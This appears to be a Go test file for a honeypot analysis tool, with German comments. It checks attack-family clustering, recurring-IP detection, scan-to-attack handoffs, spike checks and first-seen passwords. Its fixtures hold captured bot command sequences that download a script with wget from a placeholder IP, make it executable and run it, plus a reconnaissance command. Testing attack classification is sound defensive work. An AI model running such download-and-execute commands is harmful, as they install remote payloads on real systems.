package main

import (
	"context"
	"fmt"
	"testing"
	"time"
)

func TestBuildFamilies(t *testing.T) {
	now := time.Now()
	old := now.Add(-72 * time.Hour).UnixMilli()
	fresh := now.Add(-2 * time.Hour).UnixMilli()
	botA := []string{"cd /tmp", "wget http://198.51.100.1/x.sh", "chmod 777 x.sh", "./x.sh 4411"}
	botB := []string{"cd /tmp", "wget http://203.0.113.50/x.sh", "chmod 777 x.sh", "./x.sh 9038"} // gleiche Kampagne, andere Adresse und Zahl
	list := []*Attack{
		{IP: "198.51.100.1", First: old, Last: old, Commands: botA, Services: []string{"ssh"}, Tags: []Count{{Key: "download_exec", N: 1}}},
		{IP: "198.51.100.2", First: fresh, Last: fresh, Commands: botB, Services: []string{"ssh"}},
		{IP: "198.51.100.3", First: fresh, Last: fresh, Commands: []string{"cat /proc/cpuinfo | grep name | wc -l", "free -m"}, Services: []string{"telnet"}},
		{IP: "198.51.100.4", First: fresh, Last: fresh, Services: []string{"http"}},                          // ohne Befehle
		{IP: "192.168.1.2", First: fresh, Last: fresh, Commands: botA, Own: true, Services: []string{"ssh"}}, // eigener Test
	}
	fams := buildFamilies(context.Background(), list, now)
	if len(fams) != 2 {
		t.Fatalf("Familien: %+v", fams)
	}
	// neue Familie steht vorn
	if !fams[0].New || fams[0].Attacks != 1 || fams[0].IPs != 1 {
		t.Errorf("neue Familie: %+v", fams[0])
	}
	if f := fams[1]; f.New || f.Attacks != 2 || f.IPs != 2 || f.Name != "Nachladen und Ausführen über SSH" {
		t.Errorf("Kampagne: %+v", f)
	}
}

func TestRecurringAndHandoffs(t *testing.T) {
	h := int64(3600000)
	var list []*Attack
	for d := int64(0); d < 4; d++ {
		list = append(list, &Attack{IP: "203.0.113.7", First: d * 24 * h, Last: d*24*h + 60000, Stufe: 1})
	}
	list = append(list,
		&Attack{IP: "203.0.113.8", First: 0, Last: 1000, Stufe: 0, Fingerprints: []string{"HASSH selten"}},
		&Attack{IP: "203.0.113.9", First: 5 * h, Last: 6 * h, Stufe: 3, Profile: "SSH-Einbruch", Fingerprints: []string{"HASSH selten"}},
		&Attack{IP: "203.0.113.10", First: 100 * h, Last: 100 * h, Stufe: 2, Fingerprints: []string{"HASSH selten"}}, // zu spät
	)
	rec := buildRecurring(list, time.UnixMilli(0), 4, 24*time.Hour)
	if len(rec) != 1 || rec[0].IP != "203.0.113.7" || rec[0].Days != 4 || rec[0].GapHours != 24 || fmt.Sprint(rec[0].PerSlot) != "[1 1 1 1]" {
		t.Errorf("Wiederkehrer: %+v", rec)
	}
	ho := buildHandoffs(list)
	if len(ho) != 1 || ho[0].ScanIP != "203.0.113.8" || ho[0].AttackIP != "203.0.113.9" {
		t.Errorf("Erkunden → Angreifen: %+v", ho)
	}
}

func TestSpikeCheck(t *testing.T) {
	for _, c := range []struct {
		cur, mean float64
		want      bool
	}{{50, 5, false}, {120, 10, true}, {300, 120, false}, {400, 120, true}, {110, 70, false}} {
		if got := spikeCheck(c.cur, c.mean); got != c.want {
			t.Errorf("spikeCheck(%v, %v) = %v", c.cur, c.mean, got)
		}
	}
}

func TestFirstSeenEndpoint(t *testing.T) {
	h := testHive(t)
	nowH := time.Now().UnixMilli() / 3600000
	h.st.db.Exec(`INSERT INTO top_hourly (hour, field, key, label, n) VALUES (?, 'password', 'alt', '', 5), (?, 'password', 'alt', '', 1), (?, 'password', 'neu', '', 3)`,
		nowH-100, nowH, nowH)
	rows, err := h.rows(t.Context(), `SELECT key FROM top_hourly WHERE field = 'password' GROUP BY key HAVING MIN(hour) >= ?`, nowH-24)
	if err != nil || len(rows) != 1 || rows[0]["key"] != "neu" {
		t.Errorf("erstmals gesehen: %v %v", rows, err)
	}
}
